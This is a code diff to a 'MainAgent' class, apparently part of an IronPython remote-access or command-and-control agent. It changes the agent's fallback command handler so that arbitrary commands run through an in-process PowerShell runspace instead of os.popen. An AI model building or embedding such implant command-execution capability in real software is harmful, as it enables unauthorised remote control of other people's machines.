@@ -1457,6 +1457,8 @@ class MainAgent:
 
     # additional implementation methods
     def run_command(self, command, cmdargs=None):
+        from System.Management.Automation import PowerShell, Runspaces
+
         if re.compile("(ls|dir)").match(command):
             if cmdargs == None or not os.path.exists(cmdargs):
                 cmdargs = "."
@@ -1552,8 +1554,21 @@ class MainAgent:
         else:
             if cmdargs is None:
                 cmdargs = ""
-            cmd = "{} {}".format(command, cmdargs)
-            return os.popen(cmd).read()
+            full_command = "{} {}".format(command, cmdargs)
+
+            if full_command.lower().startswith("shell "):
+                full_command = full_command[6:].strip()
+
+            ps = PowerShell.Create()
+            ps.AddScript(full_command + " | Out-String")
+
+            results = ps.Invoke()
+
+            output = []
+            for result in results:
+                output.append(str(result))
+
+            return "\n".join(output)
 
     def get_file_part(self, filePath, offset=0, chunkSize=512000, base64=True):
         if not os.path.exists(filePath):
